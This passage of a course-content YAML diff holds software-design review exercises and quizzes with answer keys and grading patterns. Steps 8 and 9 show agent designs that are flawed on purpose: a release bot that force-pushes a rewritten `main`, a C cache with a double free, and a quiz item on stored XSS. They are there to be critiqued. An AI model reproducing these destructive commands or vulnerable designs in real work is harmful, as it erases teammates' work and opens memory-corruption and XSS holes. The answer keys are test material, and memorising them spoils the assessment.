+          explanation: "The rule for reuse is to identify the assumptions a module makes and check them against the new context. `DeadlineChecker` compares local clock times, which works only while everyone shares one time zone; comparing timestamps with time zones, such as UTC times, removes the assumption."
+        - type: multiple
+          difficulty: intermediate
+          question: "A team's Node.js app depends on 400 npm packages, among them an 11-line package that pads strings and a date library listed with a version range. Which practices lower the risk that a build breaks because a dependency disappears from the registry or changes its API? Select all that apply."
+          options:
+            - "Write the 11-line padding function in the project itself"
+            - "Pin the date library to an exact version and update it deliberately"
+            - "Split features into more small packages so each one does less"
+            - "Install the newest version of every package on each build"
+          correct_indices: [0, 1]
+          option_feedback:
+            0: "A trivial dependency adds a way to break and saves almost nothing: when left-pad was unpublished, builds across the internet failed."
+            1: "Without a pinned version, a new major release can change the API overnight, as urllib3 2.0.0 did to the requests package."
+            2: "More packages mean more things that can break or disappear. The rule is to strive for fewer dependencies."
+            3: "Always taking the newest version invites breaking API changes into every build. Update deliberately, then test."
+          explanation: "Strive for fewer package dependencies, especially trivial ones, and keep the versions of your dependencies fixed, updating them on purpose to receive bug fixes and security patches."
+        - type: single
+          difficulty: advanced
+          question: "In a UML class diagram for stadium ticketing, `TicketCounter.next()` is declared to return `int16`, and `TicketService` uses that value. Widening the counter to 64 bits therefore changes `next()`'s signature and `TicketService` too. Which design would have kept such a change inside `TicketCounter`?"
+          options:
+            - "`next()` returns a `TicketNumber` type that `TicketCounter` defines"
+            - "`sold` is public, so callers can read the count directly"
+            - "`TicketService` keeps its own copy of the count in an `int64`"
+            - "`TicketCounter` is a singleton shared by every service"
+          correct_index: 0
+          option_feedback:
+            1: "A public `sold` spreads the representation to every caller, so the next change to it touches even more classes."
+            2: "A second count duplicates the decision instead of hiding it, and the two counts can disagree about the next number."
+            3: "A singleton controls how many counters exist, not which classes depend on the type of its number."
+          explanation: "Information hiding keeps each likely change inside one class. A signature that names `int16` exposes the representation; a `TicketNumber` type of the counter's own hides it, so widening the number changes only `TicketCounter`."
+
+  # ==========================================================================
+  # STEP 8: Game-jam release bot (never rewrite shared history)
+  # ==========================================================================
+  # Pedagogy: faded scaffolding (default task, three-rung coach ladders) and
+  # interleaving. Like the room booking in step 5, the Given is two writers
+  # racing, but the concept is Git's: a force push switches off the check
+  # that rejects a push missing a teammate's commit, and the squash rewrites
+  # commits teammates already pulled. Lectures: L4 slide 38 (never force-push,
+  # always merge first), L10 slides 39-41 (rebase -i is destructive and needs
+  # push --force; revert is not; the safe zone). The knowledge check reaches
+  # L10 (revert), transfers to another bot, spaces step 5 (a bike-share race),
+  # and covers L19 (the Sprint Backlog does not change during a sprint).
+  - title: "Review 8: Nightly Game-Jam Release Bot"
+    key: game-jam-release-bot
+    estimated_minutes: 11
+    instructions: |
+      ### Why this matters
+
+      Agents now write the automations that run on a team's repository every night, with nobody watching. Walking through one run of such a workflow, step by step and against a real timeline, catches problems before they repeat every night.
+
+      ### 🎯 You will learn to
+
+      - Analyze a sequence diagram by placing an outside event between two of its messages.
+      - Evaluate an automated workflow against the team's user story in a concrete scenario.
+
+      A game-jam team asked an agent to automate its nightly release. Write the review comment you would post before the workflow is merged: the flaw, what goes wrong in the Given scenario, and the fix. No sentence starters this time.
+    design_review:
+      min_words: 30
+      request: |
+        "Set up a nightly release for our game-jam game: build it, put it on itch.io, and clean up `main` while you're at it, because its history is a wall of “wip” and “asdf” commits. Show me a sequence diagram of one nightly run before you write the workflow."
+      story: |
+        **As a** member of the game-jam team, **I want** a playable build of our game on itch.io every night, **so that** our playtesters can try the newest version each morning.
+      acceptance_criteria:
+        - "**Given** a teammate pushed a fix to `main`, **when** the next nightly release runs, **then** the build on itch.io includes the fix."
+        - "**Given** a day of “wip” and “asdf” commits, **when** we read the log of `main`, **then** each entry says what changed."
+      reply: |
+        Here is one nightly run of the release workflow (a GitHub Action):
+
+        - **Builds before it releases:** a build that fails never reaches itch.io.
+        - **One commit per day:** `squashDay()` turns the day's commits into "Nightly build 13", so the log of `main` reads like a changelog.
+        - **Uploads with butler**, itch.io's command-line uploader, right after the push.
+
+        Want me to write `.github/workflows/nightly.yml` next?
+      given: |
+        Tonight the bot fetches `main` at 23:55. At 23:57, while the bot is still building, Maya pushes her fix for the boss-fight crash to `main`. What does `main` on GitHub hold after the run, and which build will contain her fix?
+      diagrams:
+        - id: release-bot-run
+          type: sequence
+          label: "One nightly run (sequence diagram)"
+          source: |
+            @startuml
+            layout compact
+            actor teammate: Developer
+            participant bot: ReleaseBot
+            participant origin: GitHubRepo
+            participant itch: ItchIo
+            teammate -> origin: push main
+            note left of bot
+            Runs at 23:55 every night;
+            the build takes about 3 minutes.
+            end note
+            bot -> origin: fetch main
+            activate bot
+            bot -> bot: squashDay()
+            note right of bot
+            git reset --soft nightly-12
+            git commit -m "Nightly build 13"
+            One readable commit per day.
+            end note
+            bot -> bot: buildWeb()
+            bot -> origin: push --force main
+            note right of bot
+            --force, because the
+            squash rewrote main.
+            end note
+            bot -> itch: upload(build)
+            deactivate bot
+            @enduml
+      key:
+        flaw: "ReleaseBot rewrites main, the branch the whole team pushes to: squashDay() replaces the day's commits with one new commit, and push --force main overwrites main on GitHub with the bot's copy, deleting every commit pushed after the bot's fetch."
+        consequence: "Maya's 23:57 fix is on GitHub until the bot's push --force main replaces main with its 23:55 copy, so her commit is deleted from main. Tonight's build lacks the fix and so does tomorrow's, which breaks the first criterion, and teammates who pulled today now have a history that diverges from main."
+        fix: "Never rewrite or force-push main: keep the log readable by squash-merging each change's pull request when it is merged, and let the bot only fetch, build, tag, and upload; if it must commit to main, it fetches, merges first, and pushes without --force."
+        accept_fixes:
+          - "squash-merge pull requests instead of squashing main"
+          - "tag each nightly build and write the changelog without rewriting main"
+          - "fetch, merge, and push without --force"
+      signals:
+        flaw: ["force", "push -f", "rewrit", "overwr", "squash", "reset --soft", "history", "shared", "replac", "delet", "eras"]
+        consequence: ["maya", "\\blos[te]", "\\blose", "eras", "delet", "gone", "disappear", "missing", "overwr", "wipe", "diverg", "boss", "tomorrow", "tonight", "23:5\\d", "without (the |her )?fix"]
+        fix: ["without (--)?force", "no (--)?force", "(never|not|don'?t|stop|avoid)( to)?( use)? (--)?force", "(never|not|don'?t|stop|avoid)( to)? (rewrit|squash)", "squash[- ]?merg", "merge --squash", "feature branch", "pull request", "\\bprs?\\b", "\\btags?\\b", "changelog", "merge (it |them )?first", "fetch,? (and |then )?merg", "revert", "fast[- ]forward"]
+      anchors:
+        - { label: "push --force main", pattern: "push\\s+(--force|-f)\\b|--force\\b|force[- ]?push" }
+        - { label: "squashDay()", pattern: "squash ?day" }
+        - { label: "git reset --soft", pattern: "reset --soft" }
+        - { label: "ReleaseBot", pattern: "release ?bot" }
+      coach:
+        flaw:
+          - "Look at what the bot does to `main` between its fetch and its push. Who else writes to `main`?"
+          - "Compare `main` on GitHub just before and just after the bot's push. Which commits are in the first list but not in the second?"
+          - "Complete: “The bot rewrites `main`, which ___ also push to, and `push --force` replaces ___ with ___.”"
+        consequence:
+          - "Put Maya's 23:57 push on the diagram's timeline. Which of the bot's messages come before it, and which come after?"
+          - "After the run, list what `main` on GitHub, tonight's build, and Maya's laptop each contain. Which of them still has her fix?"
+          - "Complete: “Maya's fix reaches GitHub at 23:57, but at about 23:58 ___, so tonight's build ___ and tomorrow's build ___.”"
+        fix:
+          - "Propose a change to how the bot updates `main`, not a rule about when teammates may push."
+          - "Which step of the run makes `--force` necessary? Could the log stay readable without replacing commits that are already on `main`?"
+          - "Complete: “Squash each change when it ___, and let the bot push only ___, so that a commit it has not fetched makes its push ___ instead of disappearing.”"
+      wrong_claims:
+        - patterns: ["(run|schedul|mov)\\w* (it |the bot |the release )?(at|to|in|during) (the )?(morning|daytime|noon|9|nine|another time)", "(a )?different time", "when nobody (is online|pushes)"]
+          note: "Changing the time moves the window but does not close it: a push can still land between the bot's fetch and its push."
+        - patterns: ["commit message", "vague", "descriptive"]
+          note: "A clearer commit message would be nice, but tonight's run goes the same way with a perfect message."
+        - patterns: ["cherry[- ]?pick"]
+          note: "Cherry-picking copies commits between branches; it does not change what each nightly run does to `main`."
+        - patterns: ["bisect", "squash\\w* (loses|hides|destroys)", "lose (the )?(detailed )?history"]
+          note: "A squashed log is fine for reading and for `git bisect` when each change is squashed as it is merged. Ask which commits this squash replaces, and who already has them."
+      lesson:
+        principle: "Never Rewrite Shared History"
+        definition: |
+          **Never force-push a shared branch:** a force push "removes all other changes that might have been pushed to the remote branch", and someone might have pushed in the meantime, so always merge changes first. Commands that rewrite commits, such as `git rebase -i` or a squash, are destructive and "may require push --force": use them only on commits that exist only on your machine or on a branch only you work on.
+        ask: |
+          **Ask:** what happens to a teammate's commit that lands between this workflow's fetch and its push?
+        flaw: |
+          `ReleaseBot` squashes the day's commits on `main`, the branch every teammate pushes to, and then runs `push --force main`. The force push replaces `main` on GitHub with the bot's copy from 23:55, so Maya's 23:57 fix is deleted: neither tonight's nor tomorrow's build has it, and everyone who pulled today now holds commits that `main` no longer has.
+        fix: |
+          Leave the history of `main` alone. Squash each change when it is merged (squash-merge its pull request), and let the bot only fetch, build, tag `nightly-13`, and upload. If the bot ever has to commit to `main`, it fetches, merges, and pushes without `--force`, so a push that is missing a teammate's commit is rejected instead of erasing it.
+        more: |
+          The squash met the second acceptance criterion, and on most nights nobody pushes during the three-minute build, so the design looked fine. `--force-with-lease` would refuse tonight's push, but the bot would still rewrite commits that teammates had already pulled.
+      annotated:
+        label: "The flaw, annotated"
+        type: sequence
+        source: |
+          @startuml
+          layout compact
+          actor teammate: Developer
+          participant bot: ReleaseBot #FFE0B2
+          participant origin: GitHubRepo
+          participant itch: ItchIo
+          teammate -> origin: push main
+          note left of bot
+          Runs at 23:55 every night;
+          the build takes about 3 minutes.
+          end note
+          bot -> origin: fetch main
+          activate bot
+          bot -> bot: squashDay()
+          note right of bot
+          git reset --soft nightly-12
+          git commit -m "Nightly build 13"
+          One readable commit per day.
+          end note
+          bot -> bot: buildWeb()
+          bot -> origin: push --force main
+          note right of bot
+          --force, because the
+          squash rewrote main.
+          end note
+          bot -> itch: upload(build)
+          deactivate bot
+          callout left of text "push --force main" : Replaces main on GitHub with the bot's 23:55 copy: commits pushed since its fetch are deleted.
+          callout left of text "git reset --soft nightly-12" : The squash rewrites commits that teammates already pulled.
+          @enduml
+      fixed:
+        label: "The fixed design"
+        type: sequence
+        source: |
+          @startuml
+          layout compact
+          actor teammate: Developer
+          participant bot: ReleaseBot
+          participant origin: GitHubRepo
+          participant itch: ItchIo
+          teammate -> origin: squash-merge pull request
+          note right of teammate
+          Each change reaches main
+          as one readable commit.
+          end note
+          note left of bot
+          Runs at 23:55 every night.
+          end note
+          bot -> origin: fetch main
+          activate bot
+          bot -> bot: buildWeb()
+          bot -> origin: push tag nightly-13
+          note right of bot
+          Only a tag is pushed: main is
+          never rewritten, so no --force.
+          end note
+          bot -> itch: upload(build)
+          deactivate bot
+          @enduml
+    quiz:
+      title: "Step 8 — Knowledge Check"
+      min_score: 0.8
+      questions:
+        - type: single
+          difficulty: basic
+          question: "In Git, a commit that broke the boss fight is already on the shared `main` branch, and teammates have pulled it. Which command undoes its changes without rewriting history?"
+          options:
+            - "`git revert <commit>`"
+            - "`git rebase -i` and drop the commit"
+            - "`git reset --hard <commit>~1`"
+            - "`git commit --amend`"
+          correct_index: 0
+          option_feedback:
+            1: "Dropping a commit with `git rebase -i` creates new copies of every later commit, so `main` no longer matches teammates' clones, and publishing it needs `push --force`."
+            2: "`reset --hard` moves `main` back and drops every later commit from the branch; publishing that needs a force push that deletes them on GitHub too."
+            3: "`--amend` replaces the latest commit with a new one, so it also rewrites a commit that teammates already pulled."
+          explanation: "`git revert` adds a new commit that applies the inverse change. The bad commit stays in the history, so teammates' clones still match `main`, and a normal push publishes the undo."
+        - type: single
+          difficulty: advanced
+          question: "An AI agent's UML sequence diagram for a club website shows `FormatBot`, a GitHub Action that runs after every push to the shared `main` branch: it fetches `main`, runs a code formatter, rewrites the latest commit with `git commit --amend`, and runs `git push --force origin main`. Which change removes the cause of the risk?"
+          options:
+            - "Commit the formatting as a new commit and push it without `--force`."
+            - "Keep `--amend`, but push with `--force-with-lease` instead of `--force`."
+            - "Run `git pull --rebase` right before `git push --force`."
+            - "Format only the changed files, so the bot finishes in seconds."
+          correct_index: 0
+          option_feedback:
+            1: "The lease refuses to overwrite a push that arrived after the bot's fetch, but `--amend` still replaces a commit its author and others have already pulled, so their clones diverge."
+            2: "Pulling first shrinks the window to a moment, but a push that lands after the pull is still erased, and the amended commit still differs from the one teammates have."
+            3: "A faster bot makes the clash rarer, not impossible: a push between its fetch and its push is still erased, and the amend still rewrites shared history."
+          explanation: "A new commit leaves the existing history alone, so no force is needed. If a teammate pushed in the meantime, GitHub rejects the bot's push, and the bot fetches, merges, and pushes again."
+        - type: single
+          difficulty: intermediate
+          question: "An AI agent's UML sequence diagram for a dorm bike-share shows `RentalAPI` running `SELECT status FROM bikes WHERE id = 7` and then, if the status is `free`, `UPDATE bikes SET status = 'rented' WHERE id = 7`, each SQL statement in autocommit mode. Ana and Ben tap Rent on bike 7 within 10 ms. Which change makes exactly one rental succeed?"
+          options:
+            - "One conditional `UPDATE … WHERE id = 7 AND status = 'free'` that must change one row"
+            - "Check the bike's status again in the app right before sending the request"
+            - "Wait 100 ms between the `SELECT` and the `UPDATE`, so the other request can finish"
+            - "Retry the `UPDATE` until it succeeds, so no student sees an error"
+          correct_index: 0
+          option_feedback:
+            1: "A second check in the app is still a read before a write: both apps can see `free` before either request reaches the database."
+            2: "A delay changes the timing, not the logic: two requests that arrive together still both read `free` before either one writes."
+            3: "The plain `UPDATE` never fails, so retrying it changes nothing: both requests still rent bike 7."
+          explanation: "The database has to decide in one step: the conditional `UPDATE` checks and writes together, so the second request changes no row and can answer “just taken”. A normal `git push` protects `main` the same way, by rejecting a push that is missing commits, and `--force` switches that check off."
+        - type: single
+          difficulty: basic
+          question: "In Scrum, a stakeholder asks a student team building a campus events app for a new photo-sharing feature in the middle of a two-week sprint. Where does the new user story go?"
+          options:
+            - "Into the Product Backlog, for a later Sprint Planning"
+            - "Into the current Sprint Backlog, since agile teams respond to change"
+            - "Straight to the developer who is least busy this sprint"
+            - "Into a separate one-day sprint that starts tomorrow"
+          correct_index: 0
+          option_feedback:
+            1: "Agile teams respond to change between sprints: during a sprint the Sprint Backlog stays fixed, so the team can finish what it planned."
+            2: "Handing work to one developer skips the Product Backlog and Sprint Planning, where the team decides together what fits the next sprint."
+            3: "Starting another sprint interrupts the current one; a sprint runs uninterrupted, and new work is planned at the next Sprint Planning."
+          explanation: "A sprint is uninterrupted, and its Sprint Backlog does not change. New stories enter the Product Backlog, and the next Sprint Planning decides whether they go into a sprint."
+
+  # ==========================================================================
+  # STEP 9: Karaoke machine in C (exactly one owner per allocation)
+  # ==========================================================================
+  # Pedagogy: faded scaffolding (default task, three-rung coach ladders) and a
+  # plausible trap: the agent's reply promises "nothing leaks", which is true,
+  # so a learner who checks only for leaks finds nothing. Each module follows
+  # a sensible local rule (free what you allocate; free what you store), and
+  # together they free one buffer twice. Lectures: L13 slide 10 (leaks and
+  # segfaults), slide 31 (static analysis finds missing free, double free);
+  # SEBook c.md ("every malloc is a contract"). The knowledge check transfers
+  # the rule to a chat server, covers L13 Make (a header missing from the
+  # prerequisites), and spaces step 6 (rendering another user's text).
+  - title: "Review 9: Dorm-Lounge Karaoke Machine"
+    key: karaoke-lyrics-memory
+    estimated_minutes: 11
+    instructions: |
+      ### Why this matters
+
+      Agents write C as readily as Python, and in C the most dangerous decisions span several modules, where no single function looks wrong. Following one piece of data through a sequence diagram is how a reviewer catches them.
+
+      ### 🎯 You will learn to
+
+      - Analyze a sequence diagram by tracing one piece of data through every message that uses it.
+      - Evaluate a low-level C design against what the user sees in a concrete scenario.
+
+      Someone in your dorm asked an agent to write the lyrics display of the lounge's karaoke machine in C. Review the design before it becomes code.
+    design_review:
+      min_words: 30
+      request: |
+        "Write the lyrics part of our dorm-lounge karaoke machine in C. It reads `.lrc` files (lyrics with timestamps). Show me a sequence diagram of one song before you write code."
+      story: |
+        **As a** karaoke singer, **I want** each lyric line highlighted right on the beat, **so that** I can sing along.
+      acceptance_criteria:
+        - "**Given** a song with an `.lrc` lyrics file, **when** it plays from start to end, **then** every line shows on time."
+        - "**Given** a song just ended, **when** the next song starts, **then** the machine keeps running."
+      reply: |
+        Here is one song, from parsing to the next song:
+
+        - **Parse once, cache by song:** `LrcParser` reads the `.lrc` file once, and `LyricsCache` keeps the lines for replays.
+        - **No copying:** `cache_put` stores the parser's pointer, so a 300-line song costs no extra time or memory.
+        - **Tidy memory:** the parser frees what it allocates, and `cache_clear()` frees every cached song between songs, so nothing leaks.
+        - **Error codes:** C has no exceptions, so every function returns 0 or -1.
+
+        Should I write `lrc.c` and `cache.c` next?
+      given: |
+        Someone starts *Mr. Brightside*. Before each line, `LyricsView` asks the cache for the lyrics, and when the song ends, the next one starts. What does the singer see during the song, and what happens before the next one?
+      diagrams:
+        - id: karaoke-song
+          type: sequence
+          label: "One song (sequence diagram)"
+          source: |
+            @startuml
+            layout compact
+            participant app: KaraokeApp
+            participant parser: LrcParser
+            participant cache: LyricsCache
+            participant view: LyricsView
+            app -> parser: lrc_parse(song, path)
+            activate parser
+            parser -> cache: cache_put(song, lines)
+            note right of cache
+            Stores the pointer:
+            no copy, no extra memory.
+            end note
+            note right of parser
+            free(lines): the parser
+            frees what it allocated.
+            end note
+            parser --> app: 0
+            deactivate parser
+            loop [for each lyric line]
+            app -> view: view_tick(ms)
+            activate view
+            view -> cache: cache_get(song)
+            cache --> view: lines
+            deactivate view
+            end
+            app -> cache: cache_clear()
+            note right of cache
+            free(entry->lines) for every
+            song, so nothing leaks.
+            end note
+            @enduml
+      key:
+        flaw: "LrcParser frees lines right after cache_put stored the same pointer without copying it, so LyricsCache keeps a dangling pointer and later frees it again in cache_clear(): one buffer has two owners, and each of them frees it."
+        consequence: "During Mr. Brightside, every cache_get returns the freed lines, so LyricsView reads memory the program no longer owns: garbage lyrics or a segfault mid-song. When the song ends, cache_clear() frees the same buffer a second time, a double free that crashes before the next song."
+        fix: "Give the buffer exactly one owner: cache_put takes ownership (documented), the parser no longer frees lines, and cache_clear() frees it once after its last use. Or the cache copies the lines and frees only its copy, while the parser frees its own."
+        accept_fixes:
+          - "the cache copies the lines and frees only its copy"
+          - "one module keeps ownership and frees the buffer once after the song, and the other never frees it"
+      signals:
+        flaw: ["\\bfree", "dangl", "owner", "double", "use[- ]after[- ]free", "after (it is |it's |being )?freed", "still (holds|has|points|uses|keeps)", "same (pointer|buffer|memory|address)", "alias", "no copy", "without (a )?cop"]
+        consequence: ["segfault", "segmentation", "crash", "garbage", "corrupt", "double free", "freed memory", "undefined", "random", "invalid", "brightside", "next song", "mid-?song", "abort", "wrong (lyrics|text|line)"]
+        fix: ["own(s|er|ership)", "(don'?t|do not|not|never|stop|remove|without|no)( the)? free", "cop(y|ies|ying)", "strdup|memcpy", "take(s)? over", "transfer", "exactly once", "free(d|s)? (it |each buffer |the buffer )?once"]
+      anchors:
+        - { label: "free(lines)", pattern: "free\\s*\\(\\s*lines|frees? (the )?lines" }
+        - { label: "cache_put", pattern: "cache_?put" }
+        - { label: "cache_get", pattern: "cache_?get" }
+        - { label: "cache_clear()", pattern: "cache_?clear" }
+        - { label: "LrcParser or LyricsCache", pattern: "lrc ?parser|lyrics ?cache" }
+      coach:
+        flaw:
+          - "Follow the `lines` buffer from the parser to the end of the song. Which lifelines hold its address, and when?"
+          - "List every place that frees this buffer and every place that reads it, in the order the diagram shows them."
+          - "Complete: “The parser frees `lines` after ___, but ___ still holds the same pointer, so the buffer has ___.”"
+        consequence:
+          - "Walk through the Given one message at a time. Which messages touch `lines` after `lrc_parse` returns?"
+          - "Mark the moment `lines` is first freed. What does each later `cache_get` return, and what does `cache_clear()` do to that same address?"
+          - "Complete: “While the song plays, `cache_get` returns ___, so the view ___; when the song ends, `cache_clear()` ___, so ___.”"
+        fix:
+          - "Propose a rule for who frees the buffer, not a check that runs after it is freed."
+          - "Which module still needs `lines` last? What must the other module stop doing for that to be safe?"
+          - "Complete: “After `cache_put`, ___ owns `lines`, so ___ must not free it, and it is freed exactly once in ___.”"
+      wrong_claims:
+        - patterns: ["\\bleak"]
+          note: "The agent's design frees every buffer it allocates, so a leak is not the problem. Check instead when each free happens compared with the reads."
+        - patterns: ["try ?/? ?catch", "exception"]
+          note: "C has no exceptions, so returning error codes is the right choice here. The failure in this scenario is not reported by any return value."
+        - patterns: ["too slow", "performance", "faster", "speed"]
+          note: "Parsing each song once is fast enough for karaoke. The question is what happens to the parsed lines after `lrc_parse` returns."
+      lesson:
+        principle: "Give Every Allocation Exactly One Owner"
+        definition: |
+          **Manual memory in C:** every `malloc` is a contract that someone will eventually call `free`, exactly once, after the last use. "If you don't free the memory, you will have a memory leak", and "accessing memory that is not currently allowed by your program results in a segmentation fault". Static analysis looks for the same mistakes: "missing free", "double free", and "null pointer dereferences".
+        ask: |
+          **Ask:** who frees this memory, and does anyone still use it after that?
+        flaw: |
+          `LrcParser` frees `lines` right after `cache_put` stored the same pointer, so `LyricsCache` holds a dangling pointer. Every `cache_get` during *Mr. Brightside* returns freed memory (garbage lyrics or a segfault), and `cache_clear()` frees the buffer a second time: a double free that crashes the machine before the next song.
+        fix: |
+          Make `LyricsCache` the one owner: `cache_put` documents that it takes ownership, the parser stops freeing `lines`, and `cache_clear()` frees each buffer exactly once. If the parser must keep its own buffer, the cache copies the lines and frees only its copy.
+        more: |
+          Each module followed a sensible rule on its own: the parser frees what it allocates, and the cache frees what it stores. Together they free one buffer twice, and because freed memory often keeps its old bytes for a moment, a quick test can pass while the lounge crashes.
+      annotated:
+        label: "The flaw, annotated"
+        type: sequence
+        source: |
+          @startuml
+          layout compact
+          participant app: KaraokeApp
+          participant parser: LrcParser #FFE0B2
+          participant cache: LyricsCache #FFE0B2
+          participant view: LyricsView
+          app -> parser: lrc_parse(song, path)
+          activate parser
+          parser -> cache: cache_put(song, lines)
+          note right of cache
+          Stores the pointer:
+          no copy, no extra memory.
+          end note
+          note right of parser
+          free(lines): the parser
+          frees what it allocated.
+          end note
+          parser --> app: 0
+          deactivate parser
+          loop [for each lyric line]
+          app -> view: view_tick(ms)
+          activate view
+          view -> cache: cache_get(song)
+          cache --> view: lines
+          deactivate view
+          end
+          app -> cache: cache_clear()
+          note right of cache
+          free(entry->lines) for every
+          song, so nothing leaks.
+          end note
+          callout left of text "free(lines): the parser" : The cache keeps this pointer, so its reads hit freed memory.
+          callout left of text "free(entry->lines) for every" : The same buffer is freed a second time: a double free.
+          @enduml
+      fixed:
+        label: "The fixed design"
+        type: sequence
+        source: |
+          @startuml
+          layout compact
+          participant app: KaraokeApp
+          participant parser: LrcParser
+          participant cache: LyricsCache
+          participant view: LyricsView
+          app -> parser: lrc_parse(song, path)
+          activate parser
+          parser -> cache: cache_put(song, lines)
+          note right of cache
+          Takes ownership: no copy,
+          and the caller must not free lines.
+          end note
+          parser --> app: 0
+          deactivate parser
+          loop [for each lyric line]
+          app -> view: view_tick(ms)
+          activate view
+          view -> cache: cache_get(song)
+          cache --> view: lines
+          deactivate view
+          end
+          app -> cache: cache_clear()
+          note right of cache
+          free(entry->lines): the one
+          owner frees each buffer once.
+          end note
+          @enduml
+    quiz:
+      title: "Step 9 — Knowledge Check"
+      min_score: 0.8
+      questions:
+        - type: single
+          difficulty: basic
+          question: "In C, which rule prevents both use-after-free and double-free bugs when a pointer to heap memory is passed between modules?"
+          options:
+            - "Exactly one owner frees each allocation, once, after its last use."
+            - "Every module that receives the pointer frees it when it is done."
+            - "Set every pointer to `NULL` after `free`, so later frees are harmless."
+            - "Free memory right after the function that allocated it returns."
+          correct_index: 0
+          option_feedback:
+            1: "If every receiver frees, a buffer shared by two modules is freed twice, which is what the karaoke cache and parser did."
+            2: "`NULL` protects only the variable that was set; other copies of the same address, such as one stored in a cache, still dangle."
+            3: "Freeing that early leaves every module that received the pointer reading freed memory; early is right only after the last use."
+          explanation: "Ownership answers both questions at once: exactly one module frees the buffer, so it is never freed twice, and it frees only after the last use, so nobody reads freed memory."
+        - type: single
+          difficulty: intermediate
+          question: "In a C chat server, `read_message()` allocates a `msg` buffer, calls `queue_push(outbox, msg)` so that a sender thread can send it later, and then calls `free(msg)`. The sender thread calls `free(msg)` after sending. Which change gives the buffer exactly one owner?"
+          options:
+            - "Remove `free(msg)` from `read_message()`: the queue now owns `msg`."
+            - "Set `msg = NULL` in `read_message()` right after `free(msg)`."
+            - "Free `msg` in both places, but check `if (msg != NULL)` first."
+            - "Free `msg` in neither place, so it is never freed twice."
+          correct_index: 0
+          option_feedback:
+            1: "Setting the local variable to `NULL` changes only that variable; the queue still holds the old address, and the sender frees it again."
+            2: "The sender's copy of the pointer is not `NULL`, so the check passes and the same buffer is freed twice."
+            3: "Never freeing avoids the double free but leaks one buffer per message, so a long-running server eventually runs out of memory."
+          explanation: "Handing `msg` to the queue transfers ownership: the sender thread, which uses it last, frees it once, and `read_message()` must neither free nor touch it after `queue_push`."
+        - type: single
+          difficulty: intermediate
+          question: |
+            A C project's Makefile contains this rule, and `parser.c` includes `token.h`:
+
+            ```
+            parser.o: parser.c
+                cc -c parser.c -o parser.o
+            ```
+
+            `parser.o` already exists. A teammate changes a constant in `token.h` and runs `make parser.o`. What happens?
+          options:
+            - "Make says `parser.o` is up to date and does not recompile it."
+            - "Make recompiles `parser.o`, because `cc` reads `token.h` while compiling."
+            - "Make recompiles every object file, because a header file changed."
+            - "Make stops with an error, because `token.h` has no rule of its own."
+          correct_index: 0
+          option_feedback:
+            1: "Make decides from the rule's prerequisites and file modification times, not from what the compiler reads; `token.h` is not listed, so Make never checks it."
+            2: "Make rebuilds only targets whose listed prerequisites are newer; nothing ties every object file to every header."
+            3: "A prerequisite without a rule is fine as long as the file exists; here `token.h` is not even a prerequisite, so Make ignores it."
+          explanation: "A target is rebuilt only when one of its listed prerequisites is newer than it. Listing the header (`parser.o: parser.c token.h`) makes Make rebuild `parser.o` after `token.h` changes."
+        - type: single
+          difficulty: intermediate
+          question: "An AI agent's UML component diagram for a club's event page shows `CommentForm` (a React component) sending comments to `CommentAPI` (an Express server), which stores each comment's `body` as written; `CommentList` renders it with `dangerouslySetInnerHTML`. Which change stops a commenter's `<script>` from running in readers' browsers?"
+          options:
+            - "Sanitize `body` on the server, or escape it when rendering"
+            - "Use prepared statements for the `INSERT` that stores each comment"
+            - "Validate comments in `CommentForm` before the browser sends them"
+            - "Serve the event page over HTTPS instead of HTTP"
+          correct_index: 0
+          option_feedback:
+            1: "Prepared statements stop SQL injection in the database; the script here is stored as harmless text and runs only when a browser renders it as HTML."
+            2: "Anyone can send a request to `CommentAPI` by hand, skipping `CommentForm`, so a check that runs only in the browser does not protect other readers."
+            3: "HTTPS protects the comment in transit, but it delivers the attacker's script to every reader just as faithfully."
+          explanation: "Cross-site scripting happens when another user's text becomes HTML in a reader's browser. Sanitizing to an allow-list of tags, or storing plain text and escaping it, keeps that text from ever running as code."
+
+  # ==========================================================================
+  # STEP 10 (capstone): Bruin Monopoly on the lounge TV (separate the domain
+  # logic from the UI; choose the view for the design question)
+  # ==========================================================================
+  # Pedagogy: capstone with the scaffolding faded out: no sentence starters,
+  # two-rung coach ladders, and two views of one design. The learner first
+  # chooses the view that answers the Given's change question (L14 slides
+  # 57-58: the module view is for change impact analysis; behavioral views
+  # for order and timing). The sequence view meets the 1 s criterion, so the
+  # design looks right there; the class view shows the dependency of the
+  # rules on the UI. Lectures: L6 slides 5-9 (separation of concerns, the
+  # application layer that "doesn't have a clue that there even is a UI",
+  # Observer). The knowledge check spaces step 3 (a spy observer as the test
+  # double) and step 1 (change impact), transfers to a music app, and reaches
+  # L16 (semantic dependency) and L15 (shared data semantics).
+  - title: "Review 10: Bruin Monopoly on the Lounge TV"
+    key: bruin-monopoly-views
+    estimated_minutes: 12
+    instructions: |
+      ### Why this matters
+
+      An agent will happily hand you several diagrams of one design, and each view answers different questions. Choosing the view that answers your question is the first move of every review, and it decides whether you see a problem at all.
+
+      ### 🎯 You will learn to
+
+      - Select the view (class or sequence diagram) that answers a design question.
+      - Evaluate a design shown in two views against its acceptance criteria, without sentence starters.
+
+      This is the last review, so the coaching is shorter: two hints per part instead of three.
+    design_review:
+      min_words: 30
+      request: |
+        "We're building Bruin Monopoly for the lounge: the board on the big TV, each player's balance on their own phone. Before you code, show me a class diagram and the sequence for paying rent."
+      story: |
+        **As a** player, **I want** the board on the lounge TV and my balance on my phone to update the moment someone pays rent, **so that** everyone sees the same game.
+      acceptance_criteria:
+        - "**Given** a game on the TV and three phones, **when** a player pays rent, **then** all four screens show the new balances within 1 s."
+        - "**Given** we add a new kind of screen later, **when** it joins a game, **then** no game rule has to change."
+      reply: |
+        Here is the design, in two views:
+
+        - **Class diagram:** every rule (rent, turns, buying) lives in `Game`, so the TV and the phones can never disagree about the rules.
+        - **Sequence diagram:** `payRent()` updates the balances and then redraws the TV and every phone in the same call, well within 1 s.
+        - **React on every screen:** `TvBoardView` and `PhoneView` are React components, so the club needs only one UI framework.
+
+        Shall I start with `Game` and its tests?
+      given: |
+        The club wants two more screens: a spectator view on a second lounge TV, and a text UI that runs the game rules in automated tests. Trace what has to change to add each one.
+      task: |
+        Two views this time, in two tabs of the Diagram pane. **First decide which view shows the problem**, and name that view in your comment. Then write the flaw, what goes wrong in the Given scenario, and a fix that removes the cause.
+      diagrams:
+        - id: monopoly-classes
+          type: class
+          label: "Game and its screens (class diagram)"
+          source: |
+            @startuml
+            layout compact
+            class Game {
+              - players: Player[]
+              - tv: TvBoardView
+              - phones: PhoneView[]
+              + payRent(from, to, amount)
+              + endTurn()
+            }
+            class Player {
